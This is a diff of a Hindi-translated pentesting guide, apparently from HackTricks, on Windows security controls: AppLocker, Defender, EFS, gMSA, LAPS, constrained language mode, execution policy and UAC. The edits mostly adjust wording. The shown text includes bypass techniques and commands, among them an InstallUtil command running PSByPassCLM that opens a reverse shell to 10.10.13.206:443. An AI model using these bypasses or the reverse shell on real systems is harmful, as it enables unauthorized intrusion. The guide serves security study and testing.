@@ -6,12 +6,12 @@
 
 एक एप्लिकेशन व्हाइटलिस्ट एक अनुमोदित सॉफ़्टवेयर एप्लिकेशन या निष्पादन योग्य फ़ाइलों की सूची है जो एक सिस्टम पर मौजूद और चलाने की अनुमति है। इसका लक्ष्य पर्यावरण को हानिकारक मैलवेयर और अप्रूव्ड सॉफ़्टवेयर से बचाना है जो किसी संगठन की विशिष्ट व्यावसायिक आवश्यकताओं के साथ मेल नहीं खाता।
 
-[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) माइक्रोसॉफ्ट का **एप्लिकेशन व्हाइटलिस्टिंग समाधान** है और सिस्टम प्रशासकों को **यह नियंत्रित करने की अनुमति देता है कि उपयोगकर्ता कौन सी एप्लिकेशन और फ़ाइलें चला सकते हैं**। यह निष्पादन योग्य फ़ाइलों, स्क्रिप्टों, विंडोज इंस्टॉलर फ़ाइलों, DLLs, पैकेज्ड ऐप्स, और पैक्ड ऐप इंस्टॉलर पर **सूक्ष्म नियंत्रण** प्रदान करता है।\
+[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) माइक्रोसॉफ्ट का **एप्लिकेशन व्हाइटलिस्टिंग समाधान** है और सिस्टम प्रशासकों को **यह नियंत्रित करने की अनुमति देता है कि उपयोगकर्ता कौन से एप्लिकेशन और फ़ाइलें चला सकते हैं**। यह निष्पादन योग्य फ़ाइलों, स्क्रिप्ट, विंडोज इंस्टॉलर फ़ाइलों, DLLs, पैकेज्ड ऐप्स, और पैक्ड ऐप इंस्टॉलर पर **सूक्ष्म नियंत्रण** प्रदान करता है।\
 यह सामान्य है कि संगठन **cmd.exe और PowerShell.exe** को ब्लॉक करते हैं और कुछ निर्देशिकाओं में लिखने की अनुमति देते हैं, **लेकिन इसे सभी को बायपास किया जा सकता है**।
 
 ### Check
 
-Check which files/extensions are blacklisted/whitelisted:
+जांचें कि कौन सी फ़ाइलें/एक्सटेंशन ब्लैकलिस्टेड/व्हाइटलिस्टेड हैं:
 ```bash
 Get-ApplockerPolicy -Effective -xml
 
@@ -33,14 +33,14 @@ C:\Windows\System32\spool\drivers\color
 C:\Windows\Tasks
 C:\windows\tracing
 ```
-- सामान्यतः **विश्वसनीय** [**"LOLBAS's"**](https://lolbas-project.github.io/) बाइनरीज़ AppLocker को बायपास करने के लिए उपयोगी हो सकती हैं।
+- सामान्यतः **विश्वसनीय** [**"LOLBAS's"**](https://lolbas-project.github.io/) बाइनरीज़ AppLocker को बायपास करने के लिए उपयोगी हो सकते हैं।
 - **खराब लिखे गए नियमों को भी बायपास किया जा सकता है**
-- उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, आप कहीं भी एक **फोल्डर `allowed`** नाम से बना सकते हैं और इसे अनुमति दी जाएगी।
-- संगठन अक्सर **`%System32%\WindowsPowerShell\v1.0\powershell.exe`** निष्पादन योग्य को **ब्लॉक करने** पर ध्यान केंद्रित करते हैं, लेकिन **अन्य** [**PowerShell निष्पादन योग्य स्थानों**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) को भूल जाते हैं जैसे कि `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe`।
+- उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, आप कहीं भी एक **फोल्डर `allowed`** बना सकते हैं और इसे अनुमति दी जाएगी।
+- संगठन अक्सर **`%System32%\WindowsPowerShell\v1.0\powershell.exe` निष्पादन योग्य** को **ब्लॉक करने** पर ध्यान केंद्रित करते हैं, लेकिन **अन्य** [**PowerShell निष्पादन योग्य स्थानों**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) को भूल जाते हैं जैसे कि `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe`।
 - **DLL प्रवर्तन बहुत कम सक्षम** होता है क्योंकि यह सिस्टम पर अतिरिक्त लोड डाल सकता है, और यह सुनिश्चित करने के लिए आवश्यक परीक्षण की मात्रा। इसलिए **DLLs को बैकडोर के रूप में उपयोग करना AppLocker को बायपास करने में मदद करेगा**।
 - आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग करके **Powershell** कोड को किसी भी प्रक्रिया में निष्पादित कर सकते हैं और AppLocker को बायपास कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
-## क्रेडेंशियल्स भंडारण
+## क्रेडेंशियल्स स्टोरेज
 
 ### सुरक्षा खाता प्रबंधक (SAM)
 
@@ -71,7 +71,7 @@ LSA कुछ क्रेडेंशियल्स को डिस्क म
 
 [**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) एक एंटीवायरस है जो Windows 10 और Windows 11 में उपलब्ध है, और Windows Server के संस्करणों में। यह सामान्य पेंटेस्टिंग उपकरणों जैसे **`WinPEAS`** को **ब्लॉक** करता है। हालाँकि, इन सुरक्षा उपायों को **बायपास करने** के तरीके हैं।
 
-### जांच
+### जांचें
 
 **डिफेंडर** की **स्थिति** की जांच करने के लिए आप PS cmdlet **`Get-MpComputerStatus`** निष्पादित कर सकते हैं (यह जानने के लिए कि यह सक्रिय है, **`RealTimeProtectionEnabled`** का मान जांचें):
 
@@ -108,14 +108,14 @@ EFS फ़ाइलों को एन्क्रिप्शन के मा
 **उपयोगकर्ता की पहल के बिना डिक्रिप्शन परिदृश्य** में शामिल हैं:
 
 - जब फ़ाइलें या फ़ोल्डर को गैर-EFS फ़ाइल सिस्टम में स्थानांतरित किया जाता है, जैसे [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), तो वे स्वचालित रूप से डिक्रिप्ट हो जाते हैं।
-- SMB/CIFS प्रोटोकॉल के माध्यम से नेटवर्क पर भेजी गई एन्क्रिप्टेड फ़ाइलें प्रसारण से पहले डिक्रिप्ट की जाती हैं।
+- नेटवर्क के माध्यम से SMB/CIFS प्रोटोकॉल के माध्यम से भेजी गई एन्क्रिप्टेड फ़ाइलें प्रसारण से पहले डिक्रिप्ट की जाती हैं।
 
-यह एन्क्रिप्शन विधि मालिक के लिए एन्क्रिप्टेड फ़ाइलों तक **पारदर्शी पहुंच** की अनुमति देती है। हालाँकि, केवल मालिक का पासवर्ड बदलने और लॉग इन करने से डिक्रिप्शन की अनुमति नहीं मिलेगी।
+यह एन्क्रिप्शन विधि मालिक के लिए एन्क्रिप्टेड फ़ाइलों तक **पारदर्शी पहुंच** की अनुमति देती है। हालाँकि, केवल मालिक का पासवर्ड बदलने और लॉगिन करने से डिक्रिप्शन की अनुमति नहीं मिलेगी।
 
 **मुख्य बिंदु**:
 
 - EFS एक समानांतर FEK का उपयोग करता है, जो उपयोगकर्ता की सार्वजनिक कुंजी के साथ एन्क्रिप्ट किया गया है।
-- डिक्रिप्शन के लिए उपयोगकर्ता की निजी कुंजी का उपयोग किया जाता है ताकि FEK तक पहुंच प्राप्त की जा सके।
+- डिक्रिप्शन उपयोगकर्ता की निजी कुंजी का उपयोग करके FEK तक पहुंच प्राप्त करता है।
 - स्वचालित डिक्रिप्शन विशिष्ट परिस्थितियों के तहत होता है, जैसे FAT32 में कॉपी करना या नेटवर्क ट्रांसमिशन।
 - एन्क्रिप्टेड फ़ाइलें मालिक के लिए बिना अतिरिक्त कदमों के सुलभ होती हैं।
 
@@ -123,7 +123,7 @@ EFS फ़ाइलों को एन्क्रिप्शन के मा
 
 जांचें कि क्या एक **उपयोगकर्ता** ने इस **सेवा** का उपयोग किया है यह जांचकर कि क्या यह पथ मौजूद है:`C:\users\<username>\appdata\roaming\Microsoft\Protect`
 
-जांचें **किसके पास** फ़ाइल तक **पहुँच** है `cipher /c \<file>\`\
+जांचें **किसने** फ़ाइल तक **पहुँच** प्राप्त की है `cipher /c \<file>\`\
 आप एक फ़ोल्डर के अंदर `cipher /e` और `cipher /d` का उपयोग करके सभी फ़ाइलों को **एन्क्रिप्ट** और **डिक्रिप्ट** भी कर सकते हैं।
 
 ### Decrypting EFS files
@@ -142,11 +142,11 @@ https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
 
 Microsoft ने IT बुनियादी ढांचों में सेवा खातों के प्रबंधन को सरल बनाने के लिए **Group Managed Service Accounts (gMSA)** विकसित किया। पारंपरिक सेवा खातों के विपरीत जिनमें अक्सर "**पासवर्ड कभी समाप्त नहीं होता**" सेटिंग सक्षम होती है, gMSA एक अधिक सुरक्षित और प्रबंधनीय समाधान प्रदान करते हैं:
 
-- **स्वचालित पासवर्ड प्रबंधन**: gMSA एक जटिल, 240-चरित्र पासवर्ड का उपयोग करते हैं जो डोमेन या कंप्यूटर नीति के अनुसार स्वचालित रूप से बदलता है। यह प्रक्रिया Microsoft की की वितरण सेवा (KDC) द्वारा संभाली जाती है, जिससे मैनुअल पासवर्ड अपडेट की आवश्यकता समाप्त हो जाती है।
+- **स्वचालित पासवर्ड प्रबंधन**: gMSA एक जटिल, 240-चरित्र पासवर्ड का उपयोग करते हैं जो डोमेन या कंप्यूटर नीति के अनुसार स्वचालित रूप से बदलता है। यह प्रक्रिया Microsoft की की वितरण सेवा (KDC) द्वारा संभाली जाती है, जिससे मैन्युअल पासवर्ड अपडेट की आवश्यकता समाप्त हो जाती है।
 - **सुरक्षा में वृद्धि**: ये खाते लॉकआउट के प्रति प्रतिरक्षित होते हैं और इंटरैक्टिव लॉगिन के लिए उपयोग नहीं किए जा सकते, जिससे उनकी सुरक्षा बढ़ती है।
-- **कई होस्ट समर्थन**: gMSA को कई होस्टों के बीच साझा किया जा सकता है, जिससे ये कई सर्वरों पर चलने वाली सेवाओं के लिए आदर्श बन जाते हैं।
+- **कई होस्ट समर्थन**: gMSA को कई होस्टों के बीच साझा किया जा सकता है, जिससे वे कई सर्वरों पर चलने वाली सेवाओं के लिए आदर्श बन जाते हैं।
 - **निर्धारित कार्य क्षमता**: प्रबंधित सेवा खातों के विपरीत, gMSA निर्धारित कार्यों को चलाने का समर्थन करते हैं।
-- **सरल SPN प्रबंधन**: जब कंप्यूटर के sAMaccount विवरण या DNS नाम में परिवर्तन होते हैं, तो सिस्टम स्वचालित रूप से सेवा प्रिंसिपल नाम (SPN) को अपडेट करता है, जिससे SPN प्रबंधन सरल हो जाता है।
+- **सरल SPN प्रबंधन**: जब कंप्यूटर के sAMaccount विवरण या DNS नाम में परिवर्तन होते हैं, तो प्रणाली स्वचालित रूप से सेवा प्रिंसिपल नाम (SPN) को अपडेट करती है, जिससे SPN प्रबंधन सरल हो जाता है।
 
 gMSA के लिए पासवर्ड LDAP प्रॉपर्टी _**msDS-ManagedPassword**_ में संग्रहीत होते हैं और डोमेन नियंत्रकों (DCs) द्वारा हर 30 दिन में स्वचालित रूप से रीसेट किए जाते हैं। यह पासवर्ड, जिसे [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) के रूप में जाना जाता है, केवल अधिकृत प्रशासकों और उन सर्वरों द्वारा पुनः प्राप्त किया जा सकता है जिन पर gMSA स्थापित हैं, जिससे एक सुरक्षित वातावरण सुनिश्चित होता है। इस जानकारी तक पहुँचने के लिए, एक सुरक्षित कनेक्शन जैसे LDAPS की आवश्यकता होती है, या कनेक्शन को 'Sealing & Secure' के साथ प्रमाणित किया जाना चाहिए।
 
@@ -162,7 +162,7 @@ gMSA के लिए पासवर्ड LDAP प्रॉपर्टी _**
 
 ## LAPS
 
-**लोकल एडमिनिस्ट्रेटर पासवर्ड सॉल्यूशन (LAPS)**, जिसे [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) से डाउनलोड किया जा सकता है, स्थानीय एडमिनिस्ट्रेटर पासवर्ड का प्रबंधन करने की अनुमति देता है। ये पासवर्ड, जो **यादृच्छिक**, अद्वितीय, और **नियमित रूप से बदले जाते हैं**, सक्रिय निर्देशिका में केंद्रीय रूप से संग्रहीत होते हैं। इन पासवर्डों तक पहुंच को अधिकृत उपयोगकर्ताओं के लिए ACLs के माध्यम से सीमित किया गया है। पर्याप्त अनुमतियों के साथ, स्थानीय एडमिन पासवर्ड पढ़ने की क्षमता प्रदान की जाती है।
+**लोकल एडमिनिस्ट्रेटर पासवर्ड सॉल्यूशन (LAPS)**, जिसे [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) से डाउनलोड किया जा सकता है, स्थानीय एडमिनिस्ट्रेटर पासवर्ड का प्रबंधन करने की अनुमति देता है। ये पासवर्ड, जो **यादृच्छिक**, अद्वितीय, और **नियमित रूप से बदले जाते हैं**, सक्रिय निर्देशिका में केंद्रीय रूप से संग्रहीत होते हैं। इन पासवर्डों तक पहुंच को अधिकृत उपयोगकर्ताओं के लिए ACLs के माध्यम से प्रतिबंधित किया गया है। पर्याप्त अनुमतियों के साथ, स्थानीय एडमिन पासवर्ड पढ़ने की क्षमता प्रदान की जाती है।
 
 {{#ref}}
 active-directory-methodology/laps.md
@@ -182,10 +182,10 @@ $ExecutionContext.SessionState.LanguageMode
 #Easy bypass
 Powershell -version 2
 ```
-वर्तमान Windows में वह बायपास काम नहीं करेगा लेकिन आप उपयोग कर सकते हैं[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
-**इसे संकलित करने के लिए आपको** **ज़रूरत हो सकती है** **_एक संदर्भ जोड़ने के लिए_** -> _ब्राउज़_ -> _ब्राउज़_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` जोड़ें और **परियोजना को .Net4.5 में बदलें**.
+वर्तमान Windows में वह Bypass काम नहीं करेगा लेकिन आप उपयोग कर सकते हैं [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)।\
+**इसे संकलित करने के लिए आपको** **ज़रूरत हो सकती है** **_एक संदर्भ जोड़ने के लिए_** -> _ब्राउज़_ -> _ब्राउज़_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` जोड़ें और **परियोजना को .Net4.5 में बदलें**।
 
-#### प्रत्यक्ष बायपास:
+#### सीधे बायपास:
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
 ```
@@ -193,7 +193,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogTo
 ```bash
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
 ```
-आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग करके किसी भी प्रक्रिया में **Powershell** कोड को निष्पादित कर सकते हैं और प्रतिबंधित मोड को बायपास कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
+आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग करके **Powershell** कोड को किसी भी प्रक्रिया में निष्पादित कर सकते हैं और सीमित मोड को बायपास कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).
 
 ## PS निष्पादन नीति
 
@@ -225,7 +225,7 @@ More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershel
 
 SSPI उन दो मशीनों के लिए उपयुक्त प्रोटोकॉल खोजने के लिए जिम्मेदार होगा जो संवाद करना चाहती हैं। इसके लिए पसंदीदा विधि Kerberos है। फिर SSPI यह बातचीत करेगा कि कौन सा प्रमाणीकरण प्रोटोकॉल उपयोग किया जाएगा, इन प्रमाणीकरण प्रोटोकॉल को Security Support Provider (SSP) कहा जाता है, जो प्रत्येक Windows मशीन के अंदर DLL के रूप में स्थित होते हैं और दोनों मशीनों को संवाद करने के लिए समान का समर्थन करना चाहिए।
 
-### मुख्य SSPs
+### Main SSPs
 
 - **Kerberos**: पसंदीदा
 - %windir%\Windows\System32\kerberos.dll
@@ -238,14 +238,14 @@ SSPI उन दो मशीनों के लिए उपयुक्त प
 - **Negotiate**: इसका उपयोग प्रोटोकॉल को बातचीत करने के लिए किया जाता है (Kerberos या NTLM, जिसमें Kerberos डिफ़ॉल्ट है)
 - %windir%\Windows\System32\lsasrv.dll
 
-#### बातचीत कई विधियाँ या केवल एक ही पेश कर सकती है।
+#### The negotiation could offer several methods or only one.
 
 ## UAC - User Account Control
 
-[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक विशेषता है जो **उन्नत गतिविधियों के लिए सहमति संकेत** सक्षम करती है।
+[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक विशेषता है जो **उन्नत गतिविधियों के लिए सहमति प्रॉम्प्ट** सक्षम करती है।
 
 {{#ref}}
-windows-security-controls/uac-user-account-control.md
+authentication-credentials-uac-and-efs/uac-user-account-control.md
 {{#endref}}
 
 {{#include ../banners/hacktricks-training.md}}
